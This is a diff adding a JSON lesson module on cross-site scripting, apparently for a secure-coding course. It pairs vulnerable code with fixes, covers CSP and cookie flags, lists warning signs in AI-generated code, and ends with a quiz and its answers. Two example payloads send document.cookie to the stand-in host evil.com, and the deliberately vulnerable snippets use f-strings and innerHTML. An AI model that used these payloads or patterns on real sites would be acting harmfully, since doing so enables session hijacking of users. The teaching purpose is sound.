@@ -1,0 +1,178 @@
+{
+  "id": "xss",
+  "title": "Cross-Site Scripting (XSS)",
+  "owasp_category": "A03:2021 - Injection",
+  "cwe": ["CWE-79"],
+  "difficulty": "Beginner",
+  "estimated_time": "25 min",
+  "description": "Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users, enabling session hijacking, credential theft, defacement, and malicious redirects.",
+  "learning_objectives": [
+    "Distinguish between reflected, stored, and DOM-based XSS",
+    "Identify where untrusted data enters an HTML page unsafely",
+    "Apply context-aware output encoding to neutralise injected scripts",
+    "Implement Content Security Policy as a defence layer",
+    "Recognise XSS vulnerabilities in AI-generated template and rendering code"
+  ],
+  "sections": [
+    {
+      "id": "how-it-works",
+      "title": "How XSS Works",
+      "type": "explanation",
+      "content": "XSS occurs when an application takes untrusted input and writes it into the HTML of a page without properly encoding it first. The browser receives what looks like legitimate HTML — containing embedded script tags or event handlers — and executes the malicious code with the same trust level as the legitimate page. Unlike SQL injection which targets the server, XSS targets the users visiting the application.",
+      "key_concept": "The browser cannot tell the difference between the developer's intended HTML and an attacker's injected script — both arrive in the same page response."
+    },
+    {
+      "id": "xss-types",
+      "title": "The Three Types of XSS",
+      "type": "types",
+      "types": [
+        {
+          "name": "Reflected XSS",
+          "description": "The malicious script is embedded in a URL and reflected immediately in the page response. The victim must be tricked into clicking a crafted link. The script is not stored on the server.",
+          "example": "https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>"
+        },
+        {
+          "name": "Stored XSS",
+          "description": "The malicious script is saved to the server — in a database, comment field, or user profile — and later rendered to all users who view that content. This is the most dangerous type as it affects every visitor without any interaction from the attacker.",
+          "example": "A blog comment containing: <script>fetch('https://evil.com/steal?data='+btoa(document.cookie))</script>"
+        },
+        {
+          "name": "DOM-Based XSS",
+          "description": "The vulnerability exists entirely in client-side JavaScript. The page reads attacker-controlled data (from the URL, cookies, or localStorage) and writes it directly into the DOM using innerHTML or document.write — the server is never involved.",
+          "example": "document.getElementById('output').innerHTML = location.hash.substring(1);"
+        }
+      ]
+    },
+    {
+      "id": "attack-scenario",
+      "title": "Real-World Attack Scenario",
+      "type": "scenario",
+      "scenario": "A student forum allows users to post comments. The developer renders comment text directly into the HTML template without encoding. An attacker posts a comment containing a script tag that silently sends every visitor's session cookie to an attacker-controlled server. Every student who views the thread has their session stolen — the attacker can then impersonate them without knowing their password.",
+      "impact": [
+        "Session hijacking — steal authentication cookies and impersonate users",
+        "Credential harvesting — inject fake login forms that submit to attacker servers",
+        "Keylogging — capture everything the user types on the page",
+        "Defacement — modify the visible content of the page",
+        "Malware distribution — redirect users to pages hosting drive-by downloads"
+      ]
+    },
+    {
+      "id": "vulnerable-code",
+      "title": "Vulnerable vs Secure Code",
+      "type": "code_comparison",
+      "examples": [
+        {
+          "language": "python",
+          "label": "Python (Flask/Jinja2) — Vulnerable",
+          "vulnerable": {
+            "code": "# VULNERABLE: rendering raw user input in HTML\n# In Flask route:\n@app.route('/profile')\ndef profile():\n    name = request.args.get('name')\n    return f'<h1>Hello, {name}!</h1>'\n\n# Attacker URL: /profile?name=<script>alert(document.cookie)</script>\n# The script executes in the victim's browser",
+            "problem": "The f-string directly embeds user input into HTML. The browser interprets the injected script tag as legitimate code."
+          },
+          "secure": {
+            "code": "# SECURE: use Jinja2 auto-escaping (enabled by default)\n# In template (templates/profile.html):\n# <h1>Hello, {{ name }}!</h1>\n# Double curly braces auto-escape special characters\n\n# Or escape manually:\nfrom markupsafe import escape\n\n@app.route('/profile')\ndef profile():\n    name = request.args.get('name')\n    return f'<h1>Hello, {escape(name)}!</h1>'\n\n# <script> becomes &lt;script&gt; — displayed as text, not executed",
+            "fix": "escape() converts < > & \" ' into their HTML entity equivalents. The browser renders them as visible characters rather than interpreting them as HTML or script."
+          }
+        },
+        {
+          "language": "javascript",
+          "label": "JavaScript (DOM) — Vulnerable",
+          "vulnerable": {
+            "code": "// VULNERABLE: writing user input into innerHTML\nconst userInput = document.getElementById('comment').value;\ndocument.getElementById('preview').innerHTML = userInput;\n\n// If userInput = '<img src=x onerror=alert(1)>'\n// The browser renders the img tag and executes the onerror handler",
+            "problem": "innerHTML parses its argument as HTML, so any tags or event handlers in the string are rendered and executed."
+          },
+          "secure": {
+            "code": "// SECURE: use textContent instead of innerHTML\nconst userInput = document.getElementById('comment').value;\ndocument.getElementById('preview').textContent = userInput;\n\n// textContent treats the string as plain text — no HTML parsing\n// '<img src=x onerror=alert(1)>' is displayed literally as text",
+            "fix": "textContent assigns plain text. No HTML is parsed. Script tags and event handlers are displayed as visible characters, not executed."
+          }
+        }
+      ]
+    },
+    {
+      "id": "secure-by-design",
+      "title": "Security-by-Design Principles",
+      "type": "principles",
+      "content": "Preventing XSS requires encoding output in the right context. The same character may be safe in one context and dangerous in another.",
+      "principles": [
+        {
+          "title": "Use a Templating Engine with Auto-Escaping",
+          "detail": "Modern templating engines like Jinja2, Handlebars, and Blade auto-escape variables by default. Never disable auto-escaping unless you are deliberately rendering trusted HTML.",
+          "example": "{# Jinja2 — auto-escaped by default #}\n<p>{{ user_comment }}</p>\n\n{# Only use |safe when you KNOW the content is trusted HTML #}\n<p>{{ trusted_html_content|safe }}</p>"
+        },
+        {
+          "title": "Content Security Policy (CSP)",
+          "detail": "CSP is an HTTP response header that tells the browser which sources of scripts, styles, and other resources are trusted. A strict CSP prevents injected scripts from executing even if XSS is present.",
+          "example": "# Flask: add CSP header to all responses\n@app.after_request\ndef set_csp(response):\n    response.headers['Content-Security-Policy'] = (\n        \"default-src 'self'; script-src 'self'\"\n    )\n    return response"
+        },
+        {
+          "title": "HttpOnly and Secure Cookie Flags",
+          "detail": "Setting the HttpOnly flag on session cookies prevents JavaScript from accessing them — meaning even a successful XSS attack cannot steal the session cookie via document.cookie.",
+          "example": "# Flask session cookie configuration\napp.config['SESSION_COOKIE_HTTPONLY'] = True\napp.config['SESSION_COOKIE_SECURE'] = True   # HTTPS only\napp.config['SESSION_COOKIE_SAMESITE'] = 'Lax'"
+        }
+      ]
+    },
+    {
+      "id": "prevention-checklist",
+      "title": "Prevention Checklist",
+      "type": "checklist",
+      "items": [
+        { "id": "p1", "text": "Always encode output before rendering in HTML, JavaScript, CSS, or URL contexts" },
+        { "id": "p2", "text": "Use a templating engine with auto-escaping enabled (never disable it for user content)" },
+        { "id": "p3", "text": "Use textContent instead of innerHTML when inserting text into the DOM" },
+        { "id": "p4", "text": "Implement a Content Security Policy header on all responses" },
+        { "id": "p5", "text": "Set HttpOnly and Secure flags on all session cookies" },
+        { "id": "p6", "text": "Validate input on the server side — reject unexpected content types or formats" }
+      ]
+    },
+    {
+      "id": "ai-code-warning",
+      "title": "Watch Out in AI-Generated Code",
+      "type": "ai_warning",
+      "content": "AI assistants commonly generate JavaScript that uses innerHTML to display dynamic content, and Python code that builds HTML strings with f-strings or string concatenation. Both patterns are XSS vulnerabilities when the data source is user-controlled.",
+      "red_flags": [
+        "element.innerHTML = userInput — writing user data into innerHTML",
+        "document.write(variable) — writing user data directly to the document",
+        "return f'<tag>{variable}</tag>' — Python f-string building HTML",
+        "Jinja2 templates with {{ variable|safe }} applied to user-supplied content",
+        "React's dangerouslySetInnerHTML={{ __html: userContent }}"
+      ]
+    }
+  ],
+  "quiz": [
+    {
+      "id": "q1",
+      "question": "A developer writes: element.innerHTML = req.query.name. What type of vulnerability does this introduce?",
+      "options": [
+        "SQL Injection",
+        "DOM-Based XSS",
+        "Reflected XSS",
+        "Path Traversal"
+      ],
+      "correct": 1,
+      "explanation": "Writing user-controlled input into innerHTML is DOM-Based XSS. The vulnerability exists entirely in client-side JavaScript — the server is not involved. The browser parses the injected string as HTML, executing any embedded scripts or event handlers."
+    },
+    {
+      "id": "q2",
+      "question": "Which type of XSS is most dangerous and why?",
+      "options": [
+        "Reflected XSS, because it executes on the server",
+        "DOM-based XSS, because it cannot be detected by server-side scanning",
+        "Stored XSS, because it executes for every user who views the affected page",
+        "All types are equally dangerous"
+      ],
+      "correct": 2,
+      "explanation": "Stored XSS is generally considered most dangerous because the malicious script is saved to the server and executes automatically for every user who views the affected content — no interaction from the attacker is required after the initial injection."
+    },
+    {
+      "id": "q3",
+      "question": "Which of the following correctly prevents XSS when displaying a user-supplied comment in HTML?",
+      "options": [
+        "Remove all spaces from the input before rendering",
+        "Use escape(comment) or a templating engine that auto-escapes output",
+        "Wrap the output in a <div> tag",
+        "Check that the input length is less than 500 characters"
+      ],
+      "correct": 1,
+      "explanation": "Escaping converts dangerous characters like < > & into their HTML entity equivalents (e.g. &lt;) so the browser renders them as visible text rather than interpreting them as HTML. Length checks and div wrappers do not prevent script injection."
+    }
+  ]
+}
